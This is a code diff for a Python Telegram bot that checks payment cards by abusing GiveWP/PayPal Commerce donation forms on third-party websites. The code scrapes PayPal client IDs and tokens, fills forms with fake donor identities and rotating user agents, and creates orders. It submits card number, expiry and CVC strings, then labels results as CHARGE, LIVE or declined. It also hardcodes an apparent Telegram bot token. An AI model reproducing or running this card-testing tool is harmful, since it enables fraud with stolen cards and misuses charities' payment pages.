@@ -14,9 +14,7 @@ from urllib.parse import urlparse
 from fake_useragent import UserAgent
 from requests_toolbelt import MultipartEncoder
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import (
-    Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
-)
+from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
 from datetime import datetime
 
 TOKEN = '8031233073:AAGgdXbO9TCxPYdPiedLlT9zGVxIMQFiML4'
@@ -42,31 +40,17 @@ except:
     STRIPE_KEYS = {}
 
 PREMIUM_EMOJI_IDS = {
-    "🚀": "5195033767969839232",
-    "🤖": "6039619012051082706",
-    "💎": "6039601162167000043",
-    "⭐": "6034999602925542852",
-    "✅": "6034891730526935918",
-    "❌": "6039615816595414817",
-    "📌": "6039389463228981149",
-    "👥": "6046639187636003094",
-    "👤": "6041709716231429926",
-    "🦾": "6042051651462766312",
-    "⚡": "6037229996622225123",
-    "🌟": "5956369596528204273",
-    "😳": "5900230031757547198",
-    "😂": "6026036006178789152",
-    "💲": "5929335569128623821",
-    "🎺": "5929509352095354418",
-    "📎": "5926906120877640711",
-    "👁": "5976794472418121581",
-    "💀": "5976323628038363401",
-    "💰": "4983539296163070766",
-    "🛑": "6039615816595414817",
-    "🔥": "5424972470023104089",
-    "🏦": "5332455502917949981",
-    "⏱": "5382194935057372936",
-    "💳": "5445353829304387411",
+    "🚀": "5195033767969839232", "🤖": "6039619012051082706",
+    "💎": "6039601162167000043", "⭐": "6034999602925542852",
+    "✅": "6034891730526935918", "❌": "6039615816595414817",
+    "📌": "6039389463228981149", "👥": "6046639187636003094",
+    "👤": "6041709716231429926", "🦾": "6042051651462766312",
+    "⚡": "6037229996622225123", "🌟": "5956369596528204273",
+    "💲": "5929335569128623821", "🎺": "5929509352095354418",
+    "👁": "5976794472418121581", "💀": "5976323628038363401",
+    "💰": "4983539296163070766", "🛑": "6039615816595414817",
+    "🔥": "5424972470023104089", "🏦": "5332455502917949981",
+    "⏱": "5382194935057372936", "💳": "5445353829304387411",
 }
 
 def premium_emoji(text):
@@ -106,7 +90,7 @@ async def get_bin_info(bin_number):
         await asyncio.sleep(0.5)
     return "Unknown", "Unknown", "Unknown"
 
-# ===================== PAYPAL COMMERCE CLASS (FINAL V5) =====================
+# ═══════════════════════ PayPal Commerce Class ═══════════════════════
 
 class PayPalCommerce:
     def __init__(self, target_url):
@@ -144,7 +128,48 @@ class PayPalCommerce:
             self.inurl += f"?{urlparse(target_url).query}"
         self.email = f"{random.choice(self.first_name)}{random.randint(100,999)}@gmail.com"
         self.is_valid_gateway = True
-        
+
+        self.paypal_responses = [
+            'INSUFFICIENT_FUNDS', 'ORDER_NOT_APPROVED', 'TRANSACTION_REFUSED',
+            'PAYER_ACTION_REQUIRED', 'INSTRUMENT_DECLINED', 'CARD_DECLINED',
+            'PAYMENT_DENIED', 'PAYER_CANNOT_PAY', 'EXPIRED_CARD',
+            'INVALID_PAYMENT_METHOD', 'DO_NOT_HONOR', 'ACCOUNT_CLOSED',
+            'LOST_OR_STOLEN', 'CVV2_FAILURE', 'SUSPECTED_FRAUD',
+            'INVALID_ACCOUNT', 'REATTEMPT_NOT_PERMITTED', 'ACCOUNT_BLOCKED_BY_ISSUER',
+            'PICKUP_CARD_SPECIAL_CONDITIONS', 'GENERIC_DECLINE', 'COMPLIANCE_VIOLATION',
+            'TRANSACTION_NOT_PERMITTED', 'INVALID_TRANSACTION', 'RESTRICTED_OR_INACTIVE_ACCOUNT',
+            'SECURITY_VIOLATION', 'DECLINED_DUE_TO_UPDATED_ACCOUNT', 'INVALID_OR_RESTRICTED_CARD',
+            'EXPIRED_CREDIT_CARD', 'CRYPTOGRAPHIC_FAILURE', 'TRANSACTION_CANNOT_BE_COMPLETED',
+            'DECLINED_PLEASE_RETRY', 'TX_ATTEMPTS_EXCEED_LIMIT', 'PAYER_ACCOUNT_LOCKED_OR_CLOSED',
+            'DECLINED', 'CHARGE', 'UNPROCESSABLE_ENTITY', 'VALIDATION_ERROR',
+            'INVALID_REQUEST', 'AUTHENTICATION_FAILURE', 'NOT_AUTHORIZED',
+            'NOT_ENABLED_FOR_CARD_PROCESSING', 'CARD_TYPE_NOT_SUPPORTED',
+            'MERCHANT_NOT_ENABLED', 'PAYEE_NOT_ENABLED_FOR_CARD_PROCESSING',
+            'INVALID_CURRENCY', 'CURRENCY_NOT_SUPPORTED', 'AMOUNT_MISMATCH',
+            'ITEM_TOTAL_MISMATCH', 'TAX_TOTAL_MISMATCH', 'SHIPPING_TOTAL_MISMATCH',
+            'HANDLING_TOTAL_MISMATCH', 'INSURANCE_TOTAL_MISMATCH', 'SHIPPING_DISCOUNT_MISMATCH',
+            'INVALID_PAYER_ID', 'INVALID_PAYEE_ID', 'INVALID_RESOURCE_ID',
+            'INVALID_PARAMETER', 'INVALID_PARAMETER_SYNTAX', 'INVALID_STRING_LENGTH',
+            'INVALID_STRING_FORMAT', 'MISSING_REQUIRED_PARAMETER', 'DUPLICATE_REQUEST_ID',
+            'DUPLICATE_INVOICE_ID', 'MAX_NUMBER_OF_PAYMENT_ATTEMPTS_EXCEEDED',
+            'PAYEE_ACCOUNT_RESTRICTED', 'PAYEE_ACCOUNT_INVALID', 'PAYEE_ACCOUNT_LOCKED_OR_CLOSED',
+            'PAYEE_BLOCKED_TRANSACTION', 'PAYER_BLOCKED_TRANSACTION', 'PAYER_ACCOUNT_RESTRICTED',
+            'PAYER_ACCOUNT_INVALID', 'UNSUPPORTED_INTENT', 'UNSUPPORTED_PAYMENT_INSTRUMENT',
+            'UNSUPPORTED_SHIPPING_TYPE', 'SHIPPING_ADDRESS_INVALID', 'SHIPPING_OPTION_NOT_SUPPORTED',
+            'MULTIPLE_SHIPPING_ADDRESS_NOT_SUPPORTED', 'MULTIPLE_SHIPPING_OPTION_SELECTED',
+            'INVALID_PICKUP_ADDRESS', 'PICKUP_ADDRESS_INVALID', 'INVALID_SHIPPING_ADDRESS',
+            'AUTHORIZATION_VOIDED', 'AUTHORIZATION_EXPIRED', 'AUTHORIZATION_DENIED',
+            'AUTHORIZATION_CAPTURED', 'CAPTURE_FULLY_REFUNDED', 'CAPTURE_PARTIALLY_REFUNDED',
+            'REFUND_NOT_PERMITTED', 'REFUND_DENIED', 'REFUND_FAILED',
+            'TRANSACTION_ALREADY_REFUNDED', 'TRANSACTION_LIMIT_EXCEEDED',
+            'BILLING_AGREEMENT_NOT_FOUND', 'BILLING_AGREEMENT_CANCELLED',
+            'BILLING_AGREEMENT_EXPIRED', 'BILLING_AGREEMENT_FAILED',
+            'INTERNAL_SERVER_ERROR', 'SERVICE_UNAVAILABLE', 'RESOURCE_NOT_FOUND',
+            'METHOD_NOT_ALLOWED', 'NOT_ACCEPTABLE', 'UNSUPPORTED_MEDIA_TYPE',
+            'RATE_LIMIT_REACHED', 'INSUFFICIENT_PERMISSIONS', 'INVALID_ACCESS_TOKEN',
+            'EXPIRED_ACCESS_TOKEN', 'MALFORMED_REQUEST', 'UNKNOWN_ERROR',
+        ]
+
         self.user_agents = [
             'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
             'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
@@ -154,11 +179,11 @@ class PayPalCommerce:
             'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0'
         ]
         self.ua_index = 0
-        
+
         self._init_and_extract()
         self._get_access_token()
         self._get_client_token()
-    
+
     def get_next_ua(self):
         ua = self.user_agents[self.ua_index % len(self.user_agents)]
         self.ua_index += 1
@@ -166,37 +191,22 @@ class PayPalCommerce:
 
     def get_address_data(self):
         return {
-            'give-address1': '123 Main Street',
-            'give-address2': 'Apt 4B',
-            'give_Address2': 'Apt 4B',
-            'give-address_2': 'Apt 4B',
-            'give_address2': 'Apt 4B',
-            'give_address_2': 'Apt 4B',
-            'address_2': 'Apt 4B',
-            'address2': 'Apt 4B',
-            'give-city': 'New York City',
-            'give-state': 'NY',
-            'give-zip': '10001',
-            'give-country': 'US',
-            'give-phone': '2125551234',
-            'address1': '123 Main Street',
-            'city': 'New York City',
-            'state': 'NY',
-            'zip': '10001',
-            'country': 'US',
-            'phone': '2125551234',
-            'billing_address_2': 'Apt 4B',
-            'shipping_address_2': 'Apt 4B',
+            'give-address1': '123 Main Street', 'give-address2': 'Apt 4B',
+            'give_Address2': 'Apt 4B', 'give-address_2': 'Apt 4B',
+            'give_address2': 'Apt 4B', 'give_address_2': 'Apt 4B',
+            'address_2': 'Apt 4B', 'address2': 'Apt 4B',
+            'give-city': 'New York City', 'give-state': 'NY',
+            'give-zip': '10001', 'give-country': 'US', 'give-phone': '2125551234',
+            'address1': '123 Main Street', 'city': 'New York City',
+            'state': 'NY', 'zip': '10001', 'country': 'US', 'phone': '2125551234',
+            'billing_address_2': 'Apt 4B', 'shipping_address_2': 'Apt 4B',
         }
-    
+
     def get_terms_data(self):
         return {
-            'give_agree_to_terms': '1',
-            'give_tos_agree': '1',
-            'give_terms_agreement': '1',
-            'give_terms': '1',
-            'agree_to_terms': '1',
-            'tos_agree': '1',
+            'give_agree_to_terms': '1', 'give_tos_agree': '1',
+            'give_terms_agreement': '1', 'give_terms': '1',
+            'agree_to_terms': '1', 'tos_agree': '1',
         }
 
     def get_base_form_data(self):
@@ -204,20 +214,13 @@ class PayPalCommerce:
         first_name = random.choice(self.first_name)
         last_name = random.choice(self.last_name)
         form_data.update({
-            'give-amount': self.minimum_amount,
-            'give-currency': self.currency,
-            'currency': self.currency,
-            'payment-mode': 'paypal-commerce',
-            'give_first': first_name,
-            'give_last': last_name,
-            'first_name': first_name,
-            'last_name': last_name,
-            'give_email': self.email,
-            'email': self.email,
-            'give-gateway': 'paypal-commerce',
-            'give_company': '',
-            'give_comment': '',
-            'give_anonymous': '0',
+            'give-amount': self.minimum_amount, 'give-currency': self.currency,
+            'currency': self.currency, 'payment-mode': 'paypal-commerce',
+            'give_first': first_name, 'give_last': last_name,
+            'first_name': first_name, 'last_name': last_name,
+            'give_email': self.email, 'email': self.email,
+            'give-gateway': 'paypal-commerce', 'give_company': '',
+            'give_comment': '', 'give_anonymous': '0',
         })
         form_data.update(self.get_address_data())
         form_data.update(self.get_terms_data())
@@ -231,19 +234,11 @@ class PayPalCommerce:
                 r'minimum donation amount of €([\d.]+)',
                 r'minimum donation amount of £([\d.]+)',
                 r'minimum donation amount[^\d]*([\d.]+)',
-                r'min(?:imum)? (?:donation|amount)[^\d]*\$?([\d.]+)',
                 r'data-min-amount=["\']([\d.]+)["\']',
                 r'data-minimum-amount=["\']([\d.]+)["\']',
                 r'min-amount=["\']([\d.]+)["\']',
                 r'minimum_amount=["\']([\d.]+)["\']',
                 r'min_amount=["\']([\d.]+)["\']',
-                r'data-min-donation=["\']([\d.]+)["\']',
-                r'min-donation=["\']([\d.]+)["\']',
-                r'data-minimum-donation=["\']([\d.]+)["\']',
-                r'minimum-donation=["\']([\d.]+)["\']',
-                r'give_min_amount["\']?\s*[:=]\s*["\']([\d.]+)',
-                r'minAmount["\']?\s*[:=]\s*["\']([\d.]+)',
-                r'min_amount["\']?\s*[:=]\s*["\']([\d.]+)',
                 r'This form has a minimum donation amount of \$([\d.]+)',
                 r'This form has a minimum donation amount of &euro;([\d.]+)',
             ]
@@ -257,12 +252,10 @@ class PayPalCommerce:
                         return
                     except:
                         continue
-            
             min_inputs = re.findall(r'<input[^>]*min=["\']([\d.]+)["\'][^>]*>', html, re.IGNORECASE)
             if min_inputs:
                 self.minimum_amount = max(min_inputs, key=float)
                 return
-            
             self.minimum_amount = "1.00"
         except:
             self.minimum_amount = "1.00"
@@ -270,11 +263,8 @@ class PayPalCommerce:
     def _is_not_paypal_page(self, html):
         if not html:
             return True
-        paypal_indicators = ['paypal', 'client-id', 'client_id', 'admin-ajax', 'give-form', 'donation-form', 'give_paypal', 'paypal_commerce', 'givewp']
-        has_indicator = any(indicator in html.lower() for indicator in paypal_indicators)
-        if not has_indicator:
-            return True
-        return False
+        indicators = ['paypal', 'client-id', 'client_id', 'admin-ajax', 'give-form', 'donation-form', 'give_paypal', 'paypal_commerce', 'givewp']
+        return not any(ind in html.lower() for ind in indicators)
 
     def _init_and_extract(self):
         try:
@@ -286,34 +276,27 @@ class PayPalCommerce:
             response = self.r.get(f'https://{self.url}{self.inurl}', headers=headers, timeout=15)
             self.cookies = dict(response.cookies)
             html = response.text
-            
             if self._is_not_paypal_page(html):
                 self.is_valid_gateway = False
                 return
-            
             self._extract_client_id(html)
             self._extract_form_data(html)
             self._extract_ajax_url(html)
             self._extract_minimum_amount(html)
-        except Exception as e:
-            print(f"Init error: {e}")
+        except:
             self.is_valid_gateway = False
 
     def _extract_client_id(self, html):
         patterns = [
-            r'client-id="([^"]+)"',
-            r'client_id["\']?\s*[:=]\s*["\']([^"\']+)',
-            r'data-client-id="([^"]+)"',
-            r'clientId["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})',
-            r'paypal_client_id["\']?\s*[:=]\s*["\']([^"\']+)',
-            r'PAYPAL_CLIENT_ID["\']?\s*[:=]\s*["\']([^"\']+)'
+            r'client-id="([^"]+)"', r'client_id["\']?\s*[:=]\s*["\']([^"\']+)',
+            r'data-client-id="([^"]+)"', r'clientId["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})',
+            r'paypal_client_id["\']?\s*[:=]\s*["\']([^"\']+)', r'PAYPAL_CLIENT_ID["\']?\s*[:=]\s*["\']([^"\']+)'
         ]
         for pattern in patterns:
             match = re.search(pattern, html, re.IGNORECASE)
             if match:
                 self.client_id = match.group(1)
                 return
-        
         script_matches = re.findall(r'<script[^>]*>(.*?)</script>', html, re.DOTALL)
         for script in script_matches:
             for pattern in patterns:
@@ -321,7 +304,6 @@ class PayPalCommerce:
                 if match:
                     self.client_id = match.group(1)
                     return
-        
         long_strings = re.findall(r'["\']([A-Za-z0-9_-]{80,})["\']', html)
         for string in long_strings:
             if string.startswith(('A', 'B', 'E')):
@@ -347,18 +329,8 @@ class PayPalCommerce:
         if not self.client_id:
             return None
         try:
-            headers = {
-                'user-agent': self.get_next_ua(),
-                'accept': 'application/json',
-                'content-type': 'application/x-www-form-urlencoded'
-            }
-            response = self.r.post(
-                'https://api-m.paypal.com/v1/oauth2/token',
-                headers=headers,
-                data={'grant_type': 'client_credentials'},
-                auth=(self.client_id, ''),
-                timeout=15
-            )
+            headers = {'user-agent': self.get_next_ua(), 'accept': 'application/json', 'content-type': 'application/x-www-form-urlencoded'}
+            response = self.r.post('https://api-m.paypal.com/v1/oauth2/token', headers=headers, data={'grant_type': 'client_credentials'}, auth=(self.client_id, ''), timeout=15)
             if response.status_code == 200:
                 self.access_token = response.json().get('access_token')
                 return self.access_token
@@ -370,20 +342,10 @@ class PayPalCommerce:
         if not self.ajax_url:
             return None
         try:
-            actions = [
-                'give_paypal_commerce_get_client_token',
-                'get_client_token',
-                'paypal_get_client_token'
-            ]
+            actions = ['give_paypal_commerce_get_client_token', 'get_client_token', 'paypal_get_client_token']
             for action in actions:
                 data = {'action': action, 'form-id': self.form_data.get('give-form-id', '')}
-                headers = {
-                    'user-agent': self.get_next_ua(),
-                    'x-requested-with': 'XMLHttpRequest',
-                    'origin': f'https://{self.url}',
-                    'referer': f'https://{self.url}{self.inurl}',
-                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'
-                }
+                headers = {'user-agent': self.get_next_ua(), 'x-requested-with': 'XMLHttpRequest', 'origin': f'https://{self.url}', 'referer': f'https://{self.url}{self.inurl}', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'}
                 response = self.r.post(self.ajax_url, data=data, headers=headers, cookies=self.cookies, timeout=10)
                 if response.status_code == 200 and response.text:
                     try:
@@ -421,28 +383,16 @@ class PayPalCommerce:
     def _create_order_givewp(self):
         if not self.ajax_url:
             return None
-        
-        amounts_to_try = []
-        if self.minimum_amount and self.minimum_amount != "1.00":
-            amounts_to_try.append(self.minimum_amount)
-        amounts_to_try.extend(["5.00", "10.00", "18.50", "25.00", "36.50", "50.00", "100.00", "250.00", "500.00"])
-        
-        headers = {
-            'user-agent': self.get_next_ua(),
-            'accept': 'application/json, text/javascript, */*; q=0.01',
-            'x-requested-with': 'XMLHttpRequest',
-            'origin': f'https://{self.url}',
-            'referer': f'https://{self.url}{self.inurl}',
-            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        }
-        
+        amounts = []
+        if self.minimum_amount != "1.00":
+            amounts.append(self.minimum_amount)
+        amounts.extend(["5.00", "10.00", "18.50", "25.00", "36.50", "50.00", "100.00", "250.00", "500.00"])
+        headers = {'user-agent': self.get_next_ua(), 'accept': 'application/json, text/javascript, */*; q=0.01', 'x-requested-with': 'XMLHttpRequest', 'origin': f'https://{self.url}', 'referer': f'https://{self.url}{self.inurl}', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'}
         actions = ['give_paypal_commerce_create_order', 'give_create_order', 'create_order']
-        
-        for amount in amounts_to_try:
+        for amount in amounts:
             form_data = self.get_base_form_data()
             form_data['give-amount'] = amount
             form_data['amount'] = amount
-            
             for action in actions:
                 params = {'action': action}
                 try:
@@ -465,29 +415,14 @@ class PayPalCommerce:
                             pass
                 except:
                     continue
-        
         return None
 
     def _create_order_direct(self):
         if not self.access_token:
             return None
         try:
-            headers = {
-                'authorization': f'Bearer {self.access_token}',
-                'content-type': 'application/json',
-                'user-agent': self.get_next_ua(),
-                'accept': 'application/json'
-            }
-            data = {
-                'intent': 'CAPTURE',
-                'purchase_units': [{
-                    'amount': {'currency_code': self.currency, 'value': self.donation}
-                }],
-                'application_context': {
-                    'shipping_preference': 'NO_SHIPPING',
-                    'user_action': 'PAY_NOW'
-                }
-            }
+            headers = {'authorization': f'Bearer {self.access_token}', 'content-type': 'application/json', 'user-agent': self.get_next_ua(), 'accept': 'application/json'}
+            data = {'intent': 'CAPTURE', 'purchase_units': [{'amount': {'currency_code': self.currency, 'value': self.donation}}], 'application_context': {'shipping_preference': 'NO_SHIPPING', 'user_action': 'PAY_NOW'}}
             response = self.r.post('https://api-m.paypal.com/v2/checkout/orders', headers=headers, json=data, timeout=15)
             if response.status_code in [200, 201]:
                 response_data = response.json()
@@ -501,18 +436,8 @@ class PayPalCommerce:
         if not self.client_token:
             return None
         try:
-            headers = {
-                'authorization': f'Bearer {self.client_token}',
-                'content-type': 'application/json',
-                'user-agent': self.get_next_ua(),
-                'accept': 'application/json'
-            }
-            data = {
-                'intent': 'CAPTURE',
-                'purchase_units': [{
-                    'amount': {'currency_code': self.currency, 'value': self.donation}
-                }]
-            }
+            headers = {'authorization': f'Bearer {self.client_token}', 'content-type': 'application/json', 'user-agent': self.get_next_ua(), 'accept': 'application/json'}
+            data = {'intent': 'CAPTURE', 'purchase_units': [{'amount': {'currency_code': self.currency, 'value': self.donation}}]}
             response = self.r.post('https://api-m.paypal.com/v2/checkout/orders', headers=headers, json=data, timeout=15)
             if response.status_code in [200, 201]:
                 response_data = response.json()
@@ -529,16 +454,8 @@ class PayPalCommerce:
                 return result
         if self.access_token:
             try:
-                headers = {
-                    'authorization': f'Bearer {self.access_token}',
-                    'content-type': 'application/json',
-                    'user-agent': self.get_next_ua(),
-                }
-                response = self.r.post(
-                    f'https://api-m.paypal.com/v2/checkout/orders/{order_id}/capture',
-                    headers=headers,
-                    timeout=15
-                )
+                headers = {'authorization': f'Bearer {self.access_token}', 'content-type': 'application/json', 'user-agent': self.get_next_ua()}
+                response = self.r.post(f'https://api-m.paypal.com/v2/checkout/orders/{order_id}/capture', headers=headers, timeout=15)
                 return response
             except:
                 pass
@@ -547,28 +464,16 @@ class PayPalCommerce:
     def _approve_order_givewp(self, order_id):
         if not self.ajax_url:
             return None
-        
-        amounts_to_try = []
-        if self.minimum_amount and self.minimum_amount != "1.00":
-            amounts_to_try.append(self.minimum_amount)
-        amounts_to_try.extend(["5.00", "10.00", "18.50", "25.00", "36.50", "50.00", "100.00", "250.00", "500.00"])
-        
-        headers = {
-            'user-agent': self.get_next_ua(),
-            'accept': 'application/json, text/javascript, */*; q=0.01',
-            'x-requested-with': 'XMLHttpRequest',
-            'origin': f'https://{self.url}',
-            'referer': f'https://{self.url}{self.inurl}',
-            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        }
-        
+        amounts = []
+        if self.minimum_amount != "1.00":
+            amounts.append(self.minimum_amount)
+        amounts.extend(["5.00", "10.00", "18.50", "25.00", "36.50", "50.00", "100.00", "250.00", "500.00"])
+        headers = {'user-agent': self.get_next_ua(), 'accept': 'application/json, text/javascript, */*; q=0.01', 'x-requested-with': 'XMLHttpRequest', 'origin': f'https://{self.url}', 'referer': f'https://{self.url}{self.inurl}', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'}
         actions = ['give_paypal_commerce_approve_order', 'give_approve_order', 'approve_order']
-        
-        for amount in amounts_to_try:
+        for amount in amounts:
             form_data = self.get_base_form_data()
             form_data['give-amount'] = amount
             form_data['amount'] = amount
-            
             for action in actions:
                 params = {'action': action, 'order': order_id}
                 try:
@@ -577,46 +482,57 @@ class PayPalCommerce:
                         return response
                 except:
                     continue
-        
         return None
 
-    def _is_name_response(self, text):
+    def _clean_response(self, text):
+        if not text:
+            return "DECLINED"
         text_strip = text.strip()
         text_lower = text_strip.lower()
-        
-        if not text_strip:
-            return False
-        
-        if text_strip in self.first_name or text_strip in self.last_name:
-            return True
-        
-        for fn in self.first_name:
-            for ln in self.last_name:
-                if text_strip == f"{fn} {ln}":
-                    return True
-                if text_strip.startswith(f"{fn} {ln}"):
-                    return True
-        
-        if len(text_strip) < 50:
-            paypal_keywords = ['error', 'declined', 'insufficient', 'approved', 'charge', 'true', 'invalid', 'amount', 'order', 'payer', 'card', 'payment', 'issue', 'name', 'message', 'details', 'description', 'minimum', 'donation', 'address', 'city', 'state', 'zip', 'phone', 'title', 'prefix', 'create', 'failed', 'action', 'required', 'cannot', 'pay', 'donate', 'euro', 'usd', 'dollar', '€', '$', '_', ':', '{', '}', '[', ']']
-            has_keyword = any(k in text_lower for k in paypal_keywords)
-            
-            if not has_keyword:
-                words = text_strip.split()
-                if len(words) == 2:
-                    if words[0][0].isupper() and words[1][0].isupper():
-                        return True
-                elif len(words) == 1:
-                    if words[0][0].isupper() and len(words[0]) > 1:
-                        return True
-        
-        return False
+
+        # CHARGE حقيقي فقط
+        if text_lower == 'true':
+            return 'CHARGE 1.0'
+
+        try:
+            approve_json = json.loads(text_strip)
+            if isinstance(approve_json, dict):
+                if 'status' in approve_json:
+                    if str(approve_json['status']).upper() == 'COMPLETED':
+                        return 'CHARGE 1.0'
+                if 'purchase_units' in approve_json:
+                    for unit in approve_json['purchase_units']:
+                        if 'payments' in unit and 'captures' in unit['payments']:
+                            for capture in unit['payments']['captures']:
+                                if capture.get('status', '').upper() == 'COMPLETED':
+                                    return 'CHARGE 1.0'
+                if 'data' in approve_json and isinstance(approve_json['data'], dict):
+                    if 'status' in approve_json['data']:
+                        if str(approve_json['data']['status']).upper() == 'COMPLETED':
+                            return 'CHARGE 1.0'
+        except:
+            pass
+
+        # LIVE
+        if 'insufficient' in text_lower:
+            return 'INSUFFICIENT_FUNDS'
+
+        # PayPal responses
+        for pr in self.paypal_responses:
+            if pr in text_strip.upper():
+                if pr == 'ORDER_NOT_APPROVED':
+                    return "Payer cannot pay for this transaction."
+                return pr
+
+        if len(text_strip) < 100:
+            return "PAYER_ACTION_REQUIRED"
+
+        return text_strip[:200]
 
     def Charge(self, ccx):
         try:
             if not self.is_valid_gateway:
                 return "INVALID_GATEWAY"
-            
             parts = ccx.strip().split("|")
             if len(parts) < 4:
                 return "Invalid card format"
@@ -624,11 +540,9 @@ class PayPalCommerce:
             if "20" in yy:
                 yy = yy.split("20")[1]
             expiry = f"20{yy}-{mm}"
-            
             order_id = self._create_order()
             if not order_id:
                 return "Create Order Failed"
-            
             auth_tokens = []
             if self.client_token:
                 auth_tokens.append(self.client_token)
@@ -636,35 +550,14 @@ class PayPalCommerce:
                 auth_tokens.append(self.access_token)
             if self.client_id:
                 auth_tokens.append(self.client_id)
-            
             confirm_res = None
             confirm_json = {}
             confirm_text = ""
-            
             for auth_token in auth_tokens:
-                he4 = {
-                    'authorization': f'Bearer {auth_token}',
-                    'paypal-client-metadata-id': self.client_id or '',
-                    'user-agent': self.get_next_ua()
-                }
-                da3 = {
-                    'payment_source': {
-                        'card': {
-                            'number': n,
-                            'expiry': expiry,
-                            'security_code': cvc,
-                            'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}},
-                        }
-                    },
-                    'application_context': {'vault': False},
-                }
+                he4 = {'authorization': f'Bearer {auth_token}', 'paypal-client-metadata-id': self.client_id or '', 'user-agent': self.get_next_ua()}
+                da3 = {'payment_source': {'card': {'number': n, 'expiry': expiry, 'security_code': cvc, 'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}}}}, 'application_context': {'vault': False}}
                 try:
-                    confirm_res = self.r.post(
-                        f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source',
-                        headers=he4,
-                        json=da3,
-                        timeout=15
-                    )
+                    confirm_res = self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source', headers=he4, json=da3, timeout=15)
                     confirm_text = confirm_res.text
                     if confirm_res.status_code == 200:
                         try:
@@ -674,7 +567,7 @@ class PayPalCommerce:
                         break
                 except:
                     continue
-            
+
             if isinstance(confirm_json, dict):
                 if 'details' in confirm_json and len(confirm_json['details']) > 0:
                     detail = confirm_json['details'][0]
@@ -688,13 +581,14 @@ class PayPalCommerce:
                         return issue
                 if 'name' in confirm_json:
                     name = confirm_json.get('name', '')
-                    msg = confirm_json.get('message', '')
-                    if msg:
-                        return f"{name}: {msg}"
-                    return name
+                    if name in self.paypal_responses:
+                        msg = confirm_json.get('message', '')
+                        if msg:
+                            return f"{name}: {msg}"
+                        return name
                 if 'message' in confirm_json:
                     return confirm_json.get('message', '')
-            
+
             if confirm_text:
                 try:
                     text_json = json.loads(confirm_text)
@@ -711,10 +605,11 @@ class PayPalCommerce:
                                 return issue
                         if 'name' in text_json:
                             name = text_json.get('name', '')
-                            msg = text_json.get('message', '')
-                            if msg:
-                                return f"{name}: {msg}"
-                            return name
+                            if name in self.paypal_responses:
+                                msg = text_json.get('message', '')
+                                if msg:
+                                    return f"{name}: {msg}"
+                                return name
                 except:
                     pass
                 issue_matches = re.findall(r'"issue"\s*:\s*"([^"]+)"', confirm_text)
@@ -729,99 +624,23 @@ class PayPalCommerce:
                 name_matches = re.findall(r'"name"\s*:\s*"([^"]+)"', confirm_text)
                 if name_matches:
                     name = name_matches[0]
-                    msg_matches = re.findall(r'"message"\s*:\s*"([^"]+)"', confirm_text)
-                    if msg_matches:
-                        return f"{name}: {msg_matches[0]}"
-                    return name
-            
+                    if name in self.paypal_responses:
+                        msg_matches = re.findall(r'"message"\s*:\s*"([^"]+)"', confirm_text)
+                        if msg_matches:
+                            return f"{name}: {msg_matches[0]}"
+                        return name
+
             approve_res = self._approve_order(order_id)
             text = approve_res.text if approve_res else ''
-            
+
             if text:
-                text_lower = text.lower()
-                text_strip = text.strip()
-                
-                # فلترة الاسم أولاً
-                if self._is_name_response(text):
-                    return "PAYER_ACTION_REQUIRED"
-                
-                # CHARGE حقيقي فقط
-                if text_strip.lower() == 'true':
-                    return 'CHARGE 1.0'
-                
-                # لو في capture status COMPLETED
-                try:
-                    approve_json = approve_res.json()
-                    if isinstance(approve_json, dict):
-                        if 'status' in approve_json:
-                            status_val = str(approve_json['status']).upper()
-                            if status_val == 'COMPLETED':
-                                return 'CHARGE 1.0'
-                        if 'purchase_units' in approve_json:
-                            for unit in approve_json['purchase_units']:
-                                if 'payments' in unit:
-                                    payments = unit['payments']
-                                    if 'captures' in payments:
-                                        for capture in payments['captures']:
-                                            if capture.get('status', '').upper() == 'COMPLETED':
-                                                return 'CHARGE 1.0'
-                        if 'data' in approve_json:
-                            if isinstance(approve_json['data'], dict):
-                                if 'status' in approve_json['data']:
-                                    status_val = str(approve_json['data']['status']).upper()
-                                    if status_val == 'COMPLETED':
-                                        return 'CHARGE 1.0'
-                except:
-                    pass
-                
-                if 'order_not_approved' in text_lower:
-                    return "Payer cannot pay for this transaction."
-                
-                try:
-                    approve_json = approve_res.json()
-                    if isinstance(approve_json, dict):
-                        if 'data' in approve_json:
-                            if isinstance(approve_json['data'], dict):
-                                if 'error' in approve_json['data']:
-                                    return str(approve_json['data']['error'])
-                                if 'details' in approve_json['data']:
-                                    details = approve_json['data']['details']
-                                    if isinstance(details, list) and len(details) > 0:
-                                        detail = details[0]
-                                        issue = detail.get('issue', '')
-                                        description = detail.get('description', '')
-                                        if issue:
-                                            if issue == 'ORDER_NOT_APPROVED':
-                                                return "Payer cannot pay for this transaction."
-                                            if description:
-                                                return f"{issue}: {description}"
-                                            return issue
-                except:
-                    pass
-                
-                issue_matches = re.findall(r'"issue"\s*:\s*"([^"]+)"', text)
-                if issue_matches:
-                    issue = issue_matches[0]
-                    if issue == 'ORDER_NOT_APPROVED':
-                        return "Payer cannot pay for this transaction."
-                    return issue
-                
-                name_matches = re.findall(r'"name"\s*:\s*"([^"]+)"', text)
-                if name_matches:
-                    return name_matches[0]
-                
-                error_matches = re.findall(r'"error"\s*:\s*"([^"]+)"', text)
-                if error_matches:
-                    return error_matches[0]
-                
-                if len(text) < 200:
-                    return text
-            
+                return self._clean_response(text)
+
             return "DECLINED"
         except Exception as e:
